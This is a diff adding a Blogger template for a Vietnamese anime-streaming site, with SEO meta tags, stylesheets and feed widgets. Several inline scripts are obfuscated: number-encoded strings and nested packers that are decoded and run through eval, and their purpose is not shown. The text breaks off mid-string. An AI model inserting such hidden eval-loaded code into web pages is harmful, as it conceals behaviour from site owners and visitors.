@@ -1,0 +1,1118 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html>
+<html lang='en' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+  <head>
+    <meta charset='utf-8'/>
+    <meta content='width=device-width, initial-scale=1.0' name='viewport'/>
+	
+<b:if cond='data:blog.pageType == &quot;item&quot;'>
+<title><data:blog.pageName/> | <data:blog.title/></title>
+<b:else/>
+<title><data:blog.pageTitle/></title>
+</b:if>
+
+<b:if cond='data:blog.pageType != &quot;item&quot;'> 
+	<meta content='Anime hay nhất, Anime Vietsub, Xem Anime online, Anime Nhật Bản, Hàn Quốc Hay, Anime VietSub Hay, Anime Hay Nhất Hiện Nay, Xem Phim Anime' name='description'/>
+	<meta content='anime hay, xem anime hay nhất tại animehay.net, anime vietsub, onepice, anime online, Xem Phim Anime, Anime nhat ban, top anime' name='keywords'/>
+    <meta content='http://3.bp.blogspot.com/-HHx1wM5F8kM/VS5gEj86LCI/AAAAAAAAAEU/82KbYy6Sdtg/s1600/animehay.png' property='og:image'/>	
+<b:else/> 
+    <b:if cond='data:blog.metaDescription != &quot;&quot;'>
+    <meta expr:content='data:blog.metaDescription' name='description'/>
+    </b:if>
+	<meta expr:content='data:blog.pageName + &quot;, anime hay, xem anime hay nhất tại animehay.net, anime vietsub, onepice, anime online, Xem Phim Anime, Anime nhat ban, top anime&quot;' name='keywords'/>	
+    <b:if cond='data:blog.postImageThumbnailUrl'>
+    <meta expr:content='data:blog.postImageThumbnailUrl' property='og:image'/>
+    </b:if>
+</b:if>
+	
+<meta expr:content='&quot;vi_VI&quot;' property='og:locale'/>
+<meta expr:content='data:blog.canonicalUrl' property='og:url'/>	
+
+<data:blog.feedLinks/>
+<data:blog.meTag/>
+
+<meta content='Animehay' name='Author'/>
+<meta content='nguagovt@gmail.com' name='Email'/>
+<meta content='global' name='distribution'/>
+<meta content='5 days' name='revisit'/>
+<meta content='5 days' name='revisit-after'/>
+<meta content='document' name='resource-type'/>
+<meta content='all' name='audience'/>
+<meta content='general' name='rating'/>
+<meta content='all' name='robots'/>
+<meta content='index, follow' name='robots'/>
+<meta content='en' name='language'/>
+<meta content='IN' name='country'/>
+<meta content='blogger' name='generator'/>	
+	
+<link expr:href='data:blog.blogspotFaviconUrl' rel='shortcut icon' type='image/x-icon'/>
+
+
+<link href='http://fonts.googleapis.com/css?family=Roboto+Condensed&amp;subset=latin,vietnamese' rel='stylesheet' type='text/css'/>
+<script src='http://apis.google.com/js/plusone.js' type='text/javascript'>{lang: &#39;vi&#39;} </script>
+<script>//<![CDATA[
+var a="indexOf",b="&m=1",e="(^|&)m=",f="?",g="?m=1";function h(){var c=window.location.href,d=c.split(f);switch(d.length){case 1:return c+g;case 2:return 0<=d[1].search(e)?null:c+b;default:return null}}var k=navigator.userAgent;if(-1!=k[a]("Mobile")&&-1!=k[a]("WebKit")&&-1==k[a]("iPad")||-1!=k[a]("Opera Mini")||-1!=k[a]("IEMobile")){var l=h();l&&window.location.replace(l)};
+if (window.jstiming) window.jstiming.load.tick(&#39;headEnd&#39;);
+//]]></script>
+<script>//<![CDATA[
+(function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "//connect.facebook.net/vi_VN/all.js#xfbml=1"; fjs.parentNode.insertBefore(js, fjs);}(document, 'script', 'facebook-jssdk'));
+//]]></script>
+<script>//<![CDATA[
+var homepageurl="http://www.starphim.com";
+//]]></script>
+<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js' type='text/javascript'/>
+&lt;!--<style type='text/css'/>--&gt;
+<b:skin><![CDATA[/*]]></b:skin>
+<link href='//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css' rel='stylesheet' type='text/css'/>
+
+
+</head>
+<body>
+<link href='https://cdn.rawgit.com/buison/Css/26ceaa3218bf1311eb346d450135ed4b247033c7/all-hayphim.css' rel='stylesheet'/>
+<link href='https://cdn.rawgit.com/buison/Css/master/hayplus-hayphim.css' rel='stylesheet'/>		
+<link href='https://cdn.rawgit.com/buison/Css/master/slick-hayphim.css' rel='stylesheet'/>
+<b:if cond='data:blog.pageType == &quot;item&quot;'>	
+<script type='text/javascript'>
+//<![CDATA[	
+var _2246;var _6738='6710F105D128B1077C972F1057E647D667C962D792C997C1072C1037A982E1067C1012E1042D1037D687C972E692B1102D1057C992C1067B1072D1057E1037C647A987D1042E982D1072B1032C992C1037A1067C717F1002B992A1067B832E1027A992D1032F992E1037C1067D817B1092B852C987F687E972D692C1112E782F537B997A1072F1037F982B1067D1012A1042C1037B647C1007B1012A987D992E962C972D987D1062E687A692E647B1102D1012F997F647D687E667C687B682C662F1007D1012B987B992A962B972E987F1062F682F692B717A1067D992A1087A1067E687C692E647A792C792A682F907B39762C1067B647C892A1072E39702C1037D1002B647B822A1612F1042D682D692D1102E667B687D682F717B1087C1047D1062E962C972B987A1062D707E647A662D972E987A1062F962C1027D1042C982B972D1067D1012D1042F1037C682A692C717B982E1062D1062D687F682F987C1012F1062C1047A1027F972B1092B682D707B682D1037B1042E1037F992E682A692C782B667F687E682B662B1007A1012D987C992E962D972B987D1062F682A692A717A1067B992C1087B1067B687A682D872D40002C647E892D1072C39702B1037C1002E647F822B1612A1042C682F692A782A1112A647F992C1027E1062D992E647F1102F667C687D682D717C1087F1047B1062C962D972B987F1062B707D647C662B972C987B1062E962B1027E1042F982D972A1067A1012E1042E1037B682B692F717A982F1062D1062F687A682F987C1012F1062C1047A1027B972E1092E682B707A682C977B1027F1042F982A1022B682F692C782B667A687E682C662A1007E1012B987E992F962E972D987C1062E682D692C717C1067B992C1087E1067D687F682A907B39762A1067C647B892F1072C39702E1037F1002F647C822C1612A1042B682D692C782C1112F1077A972B1057C647B1067B972E1057B1002C992B1067E882E997C997B1062F992C1067C647D792C647C667F687D682A662D1062B1042B1037D1047B1057F1042F682F692D717D1042B997E997E1062A992E1067E687F692D717B1067F1042B1047A782D667D687F682D1007E1067F1032D1027A707E977A1042E987F1092C682E692B717F972D1037B1012D1032D972F1067E992F687C1102B1062B982D1057A1042F1027A1027F907B1042B1047D777C647A1067C972E1057D1002A992C1067E882E997F997A1062F992A1067D647A712F647A752F727F1112D707F647D752B727A727A692A782D1112B537D997D1072B1037D982F1067D1012E1042A1037D647C1007F1012A987D992E962F1027D1012A1002D1007C1067F687C692B647D1102C1012A997A647F687F667C687E682B662E1007B1012E987D992F962D1027A1012D1002C1007C1067E682B692F717E1067B992F1087A1067D687C692B792E792E682B907B39762A1067A647B1847A1647E1037E682A692E647C1102E667F687A682A662C1077E1027D1012E1002B1007F1067B962E1062F1007B972B1047C992D682B692D717F982E1062D1062F687C682B987E1012E1062E1047E1027C972E1092D682B707A682E977C1027F1042D982C1022A682D692B782F667C687D682D662F1062E1042E1037B1047D1057D1042C682D692C717F982B1062B1062C687C682D987B1012A1062D1047C1027D972B1092F682F707E682B977F1027F1042D982C1022C682F692E717A982B1062B1062B687F682C1047E1042E1062B1012B1067F1012C1042E1037D682C707F682E1057B992C1027E972F1067E1012A1077D992F682E692D717B982F1062D1062C687A682D1097D712D1012D1037F987B992A1087A682E707D682D772E772B772E772B772A682B692E782B667C687E682E662F1007C1012A987E992B962E1027A1012E1002F1007D1067F682E692B717A982E1062B1062E687A682A1097C712F1012B1037D987A992F1087F682D707C647F752E727A727E692D717C982D1062F1062D687E682D1047F1042F1062B1012F1067C1012A1042D1037B682A707B647D682F972A977B1062E1042B1027C1072F1067C992E682D692A717B982C1062B1062E687D682A987B1012C1062E1047A1027E972B1092A682D707A647F682A1012C1037C1027D1012A1037D992C712D977E1027A1042A982B1022F682F692E782E667C687C682C662E1007E1012E987A992A962C1027B1012C1002C1007F1067E682B692F717E1067D992F1087A1067E687A682F817A39752C1067F647B1847D1647B1037A682D692D782A1112F647F992A1027C1062B992F647A1102E667B687A682E662D1077C1027C1012B1002B1007D1067D962E1062B1007C972C1047A992C682A692C717B982E1062A1062B687A682E987B1012D1062B1047D1027A972E1092D682A707E682A1037E1042C1037A992A682F692F782B667C687B682E662E1062D1042B1037C1047E1057D1042A682C692A717C982D1062A1062C687A682A1097C712D1012B1037D987D992B1087F682F707B682D727E682A692B782E667B687B682C662A1007D1012B987B992B962C1027C1012E1002C1007E1067A682D692B717E1067D992C1087C1067E687B682B907D39762D1067D647E1847A1647B1037C682E692B782B667D687A682D662D1007E1012F987F992A962E1027F1012E1002A1007E1067E682D692F717A982B1062A1062E687D682F1097D712D1012F1037D987A992C1087A682A707E647D752A727A727F692D717E982D1062E1062B687B682E1047B1042C1062B1012D1067A1012C1042C1037F682B707B647C682A682A692B717C982F1062D1062E687E682E987B1012F1062D1047B1027C972A1092C682F707F647E682E682E692E782E782F1112C1112A537B997D1072D1037E982C1067A1012F1042E1037F647E1057C992D1062D1012C1097F992E962F1047C1027D972E1092A992F1057D687C692C647F1102E1012A997C647B687E667A687F682C662A1057A992A1062C1012E1097A992B962A1047C682C692A717E1067D992F1087B1067F687E692C792D792A682F887E1007A1702A1037A1002B647A907F1042F682C692F647E1102F667C687E682D717C977B1027C1042C982F1022A717B1032B992D987F1012A972E682E692D717A982E1062F1062D687C1102A682F1082E1012F987B1067D1007C682C777A682D732A727D742E767F1047F1087A682F1112C692C782A667D687E682C662D972C977F987B962F1032F1077F682F692C717B982E1062A1062F687A1102E682E1082D1012F987A1067A1007F682A777D682B732B727E742D767E1047A1087D682B707A682C1007B992D1012C1002C1007C1067F682F777B682A752D757F762A1047D1087D682D1112D692E782D667A687E682F717D1062B1012B987F992A977B972B1057B682F692D717F982F1062F1062D687C1102E682E1032A972B1057A1002F1012D1037B712A1067C1042D1047C682A777D682B732D727D762D727F1047B1087D682F1112E692E782C667D687D682F662D1057D992B1062D1012D1097D992D962A1047B682D692D717D1067E992D1087D1067E687E682C907C1007B1072C647C877C1007E39922C682F692A1112A647D992D1027F1062F992D647A1102D667C687B682A717B977E1027D1042C982D1022D717C1032F992F987D1012F972A682C692A717F982F1062F1062C687D1102B682C1082F1012E987C1067F1007E682C777C682A732D727A727F672D682E1112C692D782C667C687B682D662A972C977B987E962B1032A1077D682F692D717E982F1062C1062E687E1102A682D1082F1012F987B1067F1007E682F777D682A732E727B727F672D682D707F682A1007F992F1012F1002E1007A1067C682B777A682A747E727E727E1047F1087D682C1112A692E782D667B687C682A717B1062B1012C987D992A977F972F1057B682D692B717C982E1062E1062A687D1102F682A1032E972E1057D1002A1012D1037A712F1067A1042E1047E682E777C682F727D1047A1087A682D1112D692F782F667C687F682B662F1057B992A1062D1012C1097A992F962A1047A682E692E717A1067D992C1087C1067E687B682E887D1007A1702D1037D1002C647B907D1042A682F692A782B1112A1112C537F537F';var _4299=/[\x41\x42\x43\x44\x45\x46]/;var _8387=2;var _8995=_6738.charAt(_6738.length-1);var _1893;var _1751=_6738.split(_4299);var _9665=[String.fromCharCode,isNaN,parseInt,String];_1751[1]=_9665[_8387+1](_9665[_8387](_1751[1])/21);var _7615=(_8387==7)?String:eval;_1893='';_11=_9665[_8387](_1751[0])/_9665[_8387](_1751[1]);for(_2246=3;_2246<_11;_2246++)_1893+=(_9665[_8387-2]((_9665[_8387](_1751[_2246])+_9665[_8387](_1751[2])+_9665[_8387](_1751[1]))/_9665[_8387](_1751[1])-_9665[_8387](_1751[2])+_9665[_8387](_1751[1])-1));var _1112='_4922';var _9936='_1112=_1893';function _1153(_5321){_7615(_6481);_1153(_9798);_9798(_9936);_1153(_1112);}var _6481='_1153=_7615';var _9798='_9798=_1153';_1153(_8995);
+//]]>
+</script>
+<style>
+.block.list-film-slide .block-body .list-film {height: 100%;}
+/*Fun begins*/
+.tab_container{width: 100%; margin: 0 auto; position: relative;}
+input,section{clear:both;padding-top:10px;display:none}
+label{font-weight: 700; font-size: 11px; display: block; float: left; cursor: pointer; text-decoration: none; text-align: center; color: #eee; background: #2c2c2c; padding: 8px;}
+#tab1:checked ~ #content1,#tab2:checked ~ #content2,#tab3:checked ~ #content3,#tab4:checked ~ #content4,#tab5:checked ~ #content5{display: block;}
+.tab_container .tab-content p,.tab_container .tab-content h3{-webkit-animation:fadeInScale 0.7s ease-in-out;-moz-animation:fadeInScale 0.7s ease-in-out;animation:fadeInScale 0.7s ease-in-out}
+.tab_container .tab-content h3{text-align:center}
+.tab_container [id^=&quot;tab&quot;]:checked + label{background:#58b95b;color:#ffffff;}
+.tab_container [id^=&quot;tab&quot;]:checked + label .fa{color:#09C}
+label .fa{font-size:1.3em;margin:0 0.4em 0 0;display:inline-block;width:1.28571429em;height:auto;float:none;margin-left:-15px}
+}
+/*Media query*/
+@media only screen and (max-width:900px){
+  label span{display:none}
+  .tab_container{width:98%}
+}
+/*Content Animation*/
+@keyframes fadeInScale{
+  0%{transform:scale(0.9);opacity:0}
+  100%{transform:scale(1);opacity:1}
+}
+.clearfix:before,.clearfix:after{content:&quot; &quot;;display:table}
+
+
+</style>
+</b:if>
+<script type='text/javascript'>
+//<![CDATA[
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3x(3n(p,a,c,k,e,d){e=3n(c){3m(c<a?\'\':e(3t(c/a)))+((c=c%a)>35?3o.3s(c+29):c.3u(36))};3p(!\'\'.3r(/^/,3o)){3q(c--){d[e(c)]=k[c]||e(c)}k=[3n(e){3m d[e]}];e=3n(){3m\'\\\\w+\'};c=1};3q(c--){3p(k[c]){p=p.3r(3y 3w(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}3m p}(\'2z(1L(p,a,c,k,e,d){e=1L(c){1M(c<a?\\\'\\\':e(2m(c/a)))+((c=c%a)>35?1R.2l(c+29):c.2k(36))};1O(!\\\'\\\'.1N(/^/,1R)){1P(c--){d[e(c)]=k[c]||e(c)}k=[1L(e){1M d[e]}];e=1L(){1M\\\'\\\\\\\\w+\\\'};c=1};1P(c--){1O(k[c]){p=p.1N(28 2b(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}1M p}(\\\'C 1p(e,g){x(-1!=e.m("<")){q(v f=e.P("<"),k=0;k<f.8;k++)-1!=f[k].m(">")&&(f[k]=f[k].1j(f[k].m(">")+1,f[k].8));e=f.1o("")}q(g=g<e.8-1?g:e.8-2;" "!=e.1k(g-1)&&-1!=e.m(" ",g);)g++;e=e.1j(0,g-1);U e+"..."}C O(e){U-1!=e.m("[")?(e=e.P("[")[1].P("|")[0],"1s"==e.Q(/\\\\\\\\]/M,"")&&(e="1t"),e.Q(/\\\\\\\\]/M,"")):"1B\\\\\\\\1C b\\\\\\\\1u"}C N(e){U-1!=e.m(e)?e.P("-")[0].Q(/(\\\\\\\\[.*?\\\\\\\\])/M,""):e}C X(e){U-1!=e.m("-")?e.P("-")[1].Q(/(\\\\\\\\[.*?\\\\\\\\])/M,""):e}G=1v;C 1x(e,g,f,k,l,h){1i<1D(g)&&(g=1i);e=e.Q(/1w-c/M,"s"+g+"");1e=""!=l||""!=h?\\\\\\\'<1a 7="1c"><a u="\\\\\\\'+l+\\\\\\\'" 7="j" w="\\\\\\\'+h+\\\\\\\'"><j D="\\\\\\\'+j[e]+\\\\\\\'" 7="1z" R="\\\\\\\'+h+\\\\\\\'" /></a><9 7="1A"><p 7="1m"><a u="\\\\\\\'+l+\\\\\\\'" w="\\\\\\\'+h+\\\\\\\'">\\\\\\\'+N(h)+\\\\\\\'</a></p><p 1l="1n-1r: 1q;">\\\\\\\'+O(h)+\\\\\\\'</p></9></1a>\\\\\\\':"";E.F(1e)};C 1G(h){j=[];K=G<=h.n.o.8?G:h.n.o.8;q(v g=0;g<K;g++){v e=h.n.o[g],k=e.w.$t,l;x(g==h.n.o.8)H;q(v f=0;f<e.A.8;f++)x("Z"==e.A[f].11){l=e.A[f].u;H}s="J"I e?e.J.$t:"L"I e?e.L.$t:"";a=s.m("<j");b=s.m(\\\\\\\'D="\\\\\\\',a);c=s.m(\\\\\\\'"\\\\\\\',b+5);d=s.Y(b+5,c-b-5);-1!=a&&-1!=b&&-1!=c&&""!=d&&(j[g]=d);r=[];x(18=e.z)q(f=0;f<e.z.8;f++)r[f]=""+e.z[f].16+"";12 r="13 14";0<=g&&10>=g&&(e=\\\\\\\'<9 7="1K-V V B-1d-2 B-1f-2 B-T-3 B-T-4 B-W-6"><9 7="1b"><a 7="19" u="\\\\\\\'+l+\\\\\\\'" w="\\\\\\\'+k+\\\\\\\'"><j D="\\\\\\\'+j[g]+\\\\\\\'" R="\\\\\\\'+k+\\\\\\\'"/><i 7="1h-W 1h-T"></i></a><S 7="17">\\\\\\\'+O(k)+\\\\\\\'</S><a 7="15" u="\\\\\\\'+l+\\\\\\\'" w="\\\\\\\'+k+\\\\\\\'">\\\\\\\'+N(k)+\\\\\\\'</a><y>\\\\\\\'+X(k)+\\\\\\\'</y><y>\\\\\\\'+r[0]+\\\\\\\'</y></9></9>\\\\\\\',E.F(e))}E.F("")};C 1E(h){j=[];K=G<=h.n.o.8?G:h.n.o.8;q(v g=0;g<K;g++){v e=h.n.o[g],k=e.w.$t,l;x(g==h.n.o.8)H;q(v f=0;f<e.A.8;f++)x("Z"==e.A[f].11){l=e.A[f].u;H}s="J"I e?e.J.$t:"L"I e?e.L.$t:"";a=s.m("<j");b=s.m(\\\\\\\'D="\\\\\\\',a);c=s.m(\\\\\\\'"\\\\\\\',b+5);d=s.Y(b+5,c-b-5);-1!=a&&-1!=b&&-1!=c&&""!=d&&(j[g]=d);r=[];x(18=e.z)q(f=0;f<e.z.8;f++)r[f]=""+e.z[f].16+"";12 r="13 14";0<=g&&10>=g&&(e=\\\\\\\'<9 7="V B-1d-3 B-1f-3 B-T-6 B-W-6"><9 7="1b"><a 7="19" u="\\\\\\\'+l+\\\\\\\'" w="\\\\\\\'+k+\\\\\\\'"><j D="\\\\\\\'+j[g]+\\\\\\\'" R="\\\\\\\'+k+\\\\\\\'"/></a><S 7="17">\\\\\\\'+O(k)+\\\\\\\'</S><a 7="15" u="\\\\\\\'+l+\\\\\\\'" w="\\\\\\\'+k+\\\\\\\'">\\\\\\\'+N(k)+\\\\\\\'</a><y>\\\\\\\'+X(k)+\\\\\\\'</y><y>\\\\\\\'+r[0]+\\\\\\\'</y></9> </9>\\\\\\\',E.F(e))}E.F("")};C 1c(h){j=[];K=G<=h.n.o.8?G:h.n.o.8;q(v g=0;g<K;g++){v e=h.n.o[g],k=e.w.$t,l;x(g==h.n.o.8)H;q(v f=0;f<e.A.8;f++)x("Z"==e.A[f].11){l=e.A[f].u;H}s="J"I e?e.J.$t:"L"I e?e.L.$t:"";a=s.m("<j");b=s.m(\\\\\\\'D="\\\\\\\',a);c=s.m(\\\\\\\'"\\\\\\\',b+5);d=s.Y(b+5,c-b-5);-1!=a&&-1!=b&&-1!=c&&""!=d&&(j[g]=d);r=[];x(18=e.z)q(f=0;f<e.z.8;f++)r[f]=""+e.z[f].16+"";12 r="13 14";0<=g&&10>=g&&(e=\\\\\\\'<9 7="V"><9 7="1F">1</9><9 7="1H"><j D="\\\\\\\'+j[g]+\\\\\\\'" R="\\\\\\\'+k+\\\\\\\'"/></9><9 7="1I"><a 7="15" u="\\\\\\\'+l+\\\\\\\'" w="\\\\\\\'+k+\\\\\\\'">\\\\\\\'+N(k)+\\\\\\\'</a><y 7="17"><i 7="1g 1g-1J-1y"></i> \\\\\\\'+O(k)+\\\\\\\'</y></9></9>\\\\\\\',E.F(e))}E.F("")};\\\',2j,2i,\\\'|||||||2e|2f|2g||||||||||2h|||2n|2o|2u||2v|2w|||2t|2s|2p|1O|2r|2y|2d|2x|1L|1Z|1X|1W|20|1V|1S|1T|1U|1Y|2c|21|2a|1Q|1N|27|26|22|1M|23|24|25|2q|2O||33|3a|34|37|38|32|31|2X|2Y|2Z|30|39|3e|3k|3i|3h|3j|3l|3f|3b|3c|3g|3d|2V|2F|2G|2H|2I|2E|2D|36|2A|2B|2C|2J|2K|2R|2S|2T|2U|2Q|2P|2L|2M|2N|2W\\\'.1Q(\\\'|\\\'),0,{}))\',3v,41,\'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||3n|3m|3r|3p|3q|3z|3o|3W|3X|3Y|44|45|4b|4c|4d|4a|49|4f|47|3U|4e|3T|3G|3y||3H|3w|3F|3D|3A|3B|3C|3E|3J|3v|3u|3s|3t|3P|3O|3L|3M|3N|48|4u|4I|4K|4H|4G|4C|3x|4D|4E|4F|4L|4U|4S|4T|4Q|4R|4N|4O|4P|4J|4A|4m|4n|4o|4l|4k|4g|4h|4i|4j|4p|4q|4B|4x|4y|4z|4w|4v|||4r|4s|4t|46|4M|3S|3R|3Q|3K|3I|3V|3Z|40|43|42\'.3z(\'|\'),0,{}))',62,305,'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return|function|String|if|while|replace|fromCharCode|parseInt|toString|62|RegExp|eval|new|split|class|length|div|link|img|gi|alt|altit|data1|109|substring|title|substr|dfn|feed|indexOf|lg|font|style|span|xs|fa|in|content|maxpost|md|hidden|208|2E3|data|break|write|else|item|var|titvn|numposts|document|summary|src|titen|sm|Number|slide1|join|owl|u1ecdn|Ch|alternate|slide|st|cate|poster|label|name|topview|href|No|rel|inner|status|term|quote|li|category|s72|thumbsd|left|col|tennhan|entry|info|for|u1ed9|charAt|wfull|delta|thumb|size|HD|rutgon|11px|Full'.split('|'),0,{}))
+
+//]]></script>
+<b:if cond='data:blog.url == data:blog.homepageUrl'>
+<script type='text/javascript'>
+//<![CDATA[
+var _2289;var _8551='13251B147D149E1552A1671A1524A1601A1125F1559E1664B1615C1538A1657B1580E1622C1615B1125A1629E1153D1524C1153B1538F1153F1594C1153B1552D1153C1545E1132D1706A1552E1272D1559C1664F1615E1538B1657E1580E1622F1615A1125C1538A1132A1706D1643D1552B1657F1664A1643E1615C1125D1538E1265A1524B1286A1118E1118A1251F1552A1125B1629D1524C1643C1650E1552C1356F1615E1657A1125A1538D1174D1524C1132E1132C1132B1146D1125C1125B1538B1272F1538D1104D1524A1132C1279B1202D1216D1286F1426D1657F1643B1580C1615E1566F1167B1559D1643A1622C1608D1314D1573F1524C1643A1314E1622E1545C1552A1125B1538A1146A1195C1244C1132A1251F1538E1167F1657C1622F1426B1657C1643E1580C1615B1566B1125E1202A1223A1132D1132E1720F1258B1580B1559D1125C1076B1118B1118D1167A1643F1552C1629E1601E1524D1538D1552A1125E1174E1503F1174D1153E1426E1657D1643F1580B1615C1566F1132F1132D1706B1678D1573A1580D1601D1552C1125C1538C1160D1160F1132C1706D1545F1482C1552A1125A1538C1132E1496E1272C1594D1482F1538D1496A1713E1713F1552A1125D1538E1132F1720A1594F1272C1482A1559C1664F1615D1538F1657E1580A1622E1615B1125C1552F1132C1706F1643C1552E1657B1664F1643D1615B1069A1545D1482F1552D1496C1720A1496C1258B1552E1272F1559B1664A1615B1538A1657D1580B1622E1615C1125F1132A1706E1643B1552D1657B1664C1643D1615E1118F1489A1489D1678B1146A1118F1720D1258B1538D1272E1188E1720F1258D1678F1573E1580B1601E1552C1125E1538D1160E1160A1132F1706C1580C1559E1125E1594E1482F1538A1496E1132E1706B1629A1272D1629E1167D1643B1552D1629F1601E1524F1538F1552D1125A1615B1552B1678A1069A1419A1552F1566B1328D1685A1629B1125A1118E1489C1489B1531B1118C1146E1552E1125B1538B1132B1146F1118A1489A1489D1531E1118C1153C1118F1566C1118C1132E1153C1594A1482C1538C1496B1132E1720D1720B1643B1552E1657B1664E1643B1615D1069B1629D1720D1125F1118C1188B1412F1125E1188D1230D1125D1629D1153D1524D1153E1538E1153B1594A1153F1552C1153E1545E1132F1706B1552F1272A1188B1230E1125F1538F1132F1706D1188D1237D1125A1538C1265F1524D1286B1489A1118F1489E1118F1251E1552B1125D1188A1678C1125D1538A1174F1524D1132C1132F1132B1146E1125F1125C1538B1272B1538D1104B1524A1132E1279A1188C1643F1286A1188F1524F1167B1188A1636B1125C1538C1146D1195D1244F1132A1251A1538B1167A1188A1650E1125A1188F1657D1132C1132A1720F1258B1188A1244A1125B1076B1489E1118F1489D1118B1167A1188E1538C1125C1174F1503E1174E1153D1188E1524F1132F1132F1706A1188C1531F1125F1538A1160A1160B1132A1706E1545E1482E1552A1125A1538E1132B1496E1272B1594C1482A1538A1496B1713D1713C1552B1125C1538E1132D1720E1594E1272C1482D1188A1230B1125E1552A1132F1706F1188F1237E1069A1545E1482A1552E1496F1720F1496C1258E1552B1272A1188B1230C1125B1132D1706D1188C1237F1489B1118E1489D1489B1489B1489A1678D1146C1489A1118A1720A1258E1538A1272D1188B1720C1258E1188E1531D1125B1538E1160C1160A1132C1706C1188B1244E1125C1594D1482B1538C1496C1132C1706B1629E1272C1629F1167F1188D1538B1125E1188D1671F1069A1188B1664F1125C1489F1118C1489C1489F1489D1489C1531F1489A1118F1146F1552E1125B1538C1132B1146B1489D1118A1489C1489C1489C1489F1531C1489D1118E1153B1489B1118E1566B1489F1118B1132C1153A1594F1482F1538F1496E1132C1720E1720D1188B1237C1069B1629A1720E1125C1489B1118A1398D1069A1363F1125E1594C1132D1706B1244B1272B1482C1496B1258C1685E1272C1335F1265A1272E1594A1167A1573E1167F1230D1167D1223A1286B1335C1251B1594F1167C1573E1167E1230B1167F1223F1258E1636B1125E1580C1069A1566B1272F1181C1258D1566C1265B1685D1258F1566B1146E1146A1132F1706F1580E1069E1552A1272B1594D1167A1573A1167D1230E1482F1566F1496F1153F1601D1272A1552D1167C1671D1167B1097C1657C1153E1608B1258B1587A1125A1566D1272E1272C1594D1167D1573E1167A1230B1167F1223C1132F1314D1258D1636B1125F1580F1069B1559B1272A1181E1258D1559B1265E1552F1167F1209D1167A1223E1258D1559C1146D1146B1132F1587F1125D1083B1356B1083B1272D1272C1552F1167D1209C1482D1559A1496D1167C1349C1132C1706A1608B1272E1552C1167D1209D1482D1559F1496F1167A1678C1258B1314C1720A1580C1069F1615D1272E1083B1328B1083D1342C1069C1552C1286A1552F1167A1328B1167A1097C1657E1251B1083E1300B1083E1342A1069F1552C1286E1552F1167A1300E1167B1097D1657D1251D1083E1083C1258E1650B1272D1615B1258F1524B1272A1650F1167F1622E1125A1083D1265B1244D1083F1132F1258E1531D1272D1650B1167E1622B1125A1489E1489E1489D1118E1377E1272D1083A1489C1489F1489B1118F1153B1524C1132A1258C1538C1272B1650F1167A1622B1125F1489C1489C1489A1118A1083E1489B1489A1489B1118E1153D1531C1146E1216A1132A1258F1545B1272E1650A1167F1384E1125E1531B1146F1216F1153D1538A1160C1531B1160B1216A1132D1258C1160A1188E1076C1272E1524D1111F1111C1160C1188B1076C1272F1531F1111E1111A1160E1188B1076B1272D1538C1111A1111E1083B1083F1076E1272C1545A1111B1111B1125F1244E1482F1566E1496A1272C1545A1132A1258C1643A1272A1482F1496C1258D1587A1125F1370A1272C1552F1167D1629D1132A1636F1125A1559F1272E1181D1258C1559E1265E1552C1167A1629B1167D1223F1258D1559F1146F1146C1132D1643C1482C1559E1496E1272D1083E1083A1146C1552F1167B1629E1482E1559A1496B1167C1391D1146D1083F1083B1258E1433D1069F1643A1272E1083C1405A1069E1188A1202B1083A1258E1181C1265C1272A1566B1111D1111B1188C1209B1279C1272D1566F1111A1111F1125E1552C1272C1489E1489A1489E1118A1265A1307E1069A1195C1272A1083E1692E1083D1279D1265E1524E1069E1195C1272C1083E1692D1160C1209D1083A1069D1678A1272F1083A1489A1489F1489F1118C1146D1608E1146D1489B1489C1489D1118F1083F1069B1671F1272A1083A1489E1489B1489B1118C1146D1601F1146F1489A1489E1489D1118C1083B1279C1265B1202C1069F1195F1272D1083E1188F1216D1083F1069B1188D1188A1272D1083B1440E1160F1188A1195B1251E1069A1426F1125D1489A1489C1489C1118C1146B1244B1482A1566C1496E1146A1489E1489D1489E1118B1132B1258E1083C1279E1265D1174D1202F1279C1265D1202F1069C1195E1272F1083C1412B1083E1279E1265C1237A1069C1195A1272C1083D1321F1160F1419D1069F1209B1083D1279C1489A1489E1489B1118D1146C1447A1125E1601D1132A1146C1489A1489C1489A1118E1265D1174D1237C1279B1265D1237A1069E1195B1272B1083E1321A1160E1454E1083F1279D1489F1489D1489C1118D1146B1188D1181C1125E1601A1132C1146A1489C1489B1489C1118F1265E1174B1237F1279D1265B1174D1202F1279F1265D1174D1524A1279A1265F1202B1069C1195C1272A1083D1475D1083A1279D1489C1489C1489F1118B1146E1468C1125D1601E1132B1146E1489A1489C1489A1118E1265C1174E1202C1279E1265E1202D1069F1195F1272A1083B1461B1083B1279D1265B1174B1202B1279A1265E1174C1307E1279B1489F1489F1489A1118B1153A1699A1167D1664D1125B1552B1132B1132D1720D1699E1167F1664F1125A1083E1083D1132D1720F1258C1489D1118D1153E1188B1685E1153B1188C1314D1153D1489E1118C1713D1713F1188B1307A1713D1188A1300B1713D1188A1629E1713F1713F1188D1699F1713D1188C1321D1713D1188A1552A1713D1188B1328F1713A1713B1713E1713F1713F1713B1713D1713C1188B1573E1713D1188A1559C1713F1188C1244D1713C1713E1713F1713D1713C1188D1545F1713C1188D1566F1713D1188F1622F1713A1188C1615C1713B1713C1713E